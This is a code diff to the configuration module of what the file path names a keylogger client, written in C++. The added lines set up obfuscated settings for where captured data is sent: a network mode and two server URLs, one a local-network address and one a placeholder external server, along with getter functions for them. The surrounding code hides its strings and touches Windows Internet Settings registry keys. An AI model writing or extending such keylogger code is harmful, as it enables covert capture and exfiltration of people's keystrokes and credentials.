@@ -1,3 +1,4 @@
+// KeyLoggerClient/src/core/Configuration.cpp
 #include "core/Configuration.h"
 #include "core/Logger.h"
 #include "utils/FileUtils.h"
@@ -28,6 +29,9 @@ constexpr auto OBF_KEY_PROXY_SERVER = OBFUSCATE("proxy_server");
 constexpr auto OBF_KEY_PROXY_PORT = OBFUSCATE("proxy_port");
 constexpr auto OBF_KEY_USER_AGENT = OBFUSCATE("user_agent");
 constexpr auto OBF_KEY_TIMEOUT = OBFUSCATE("timeout");
+constexpr auto OBF_KEY_NETWORK_MODE = OBFUSCATE("network_mode");
+constexpr auto OBF_KEY_SAME_WIFI_URL = OBFUSCATE("same_wifi_server_url");
+constexpr auto OBF_KEY_DIFFERENT_WIFI_URL = OBFUSCATE("different_wifi_server_url");
 
 // Obfuscated registry paths
 constexpr auto OBF_REGISTRY_PATH = OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings");
@@ -230,6 +234,9 @@ void Configuration::SetDefaultValues() {
     m_configValues[OBFUSCATE_STR("user_agent")] = 
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
     m_configValues[OBFUSCATE_STR("timeout")] = "30000"; // 30 seconds
+    m_configValues[OBFUSCATE_STR("network_mode")] = "auto";
+    m_configValues[OBFUSCATE_STR("same_wifi_server_url")] = "http://192.168.1.100:8080";
+    m_configValues[OBFUSCATE_STR("different_wifi_server_url")] = "https://your-external-server.com";
 }
 
 std::string Configuration::GenerateConfigurationKey() const {
@@ -341,6 +348,18 @@ uint32_t Configuration::GetTimeout() const {
         LOG_ERROR("Invalid timeout, using default 30000ms");
         return 30000;
     }
+}
+
+std::string Configuration::GetNetworkMode() const {
+    return GetValue(OBFUSCATE_STR("network_mode"), "auto");
+}
+
+std::string Configuration::GetSameWifiServerUrl() const {
+    return GetValue(OBFUSCATE_STR("same_wifi_server_url"), "http://192.168.1.100:8080");
+}
+
+std::string Configuration::GetDifferentWifiServerUrl() const {
+    return GetValue(OBFUSCATE_STR("different_wifi_server_url"), "https://your-external-server.com");
 }
 
 void Configuration::SetValue(const std::string& key, const std::string& value) {
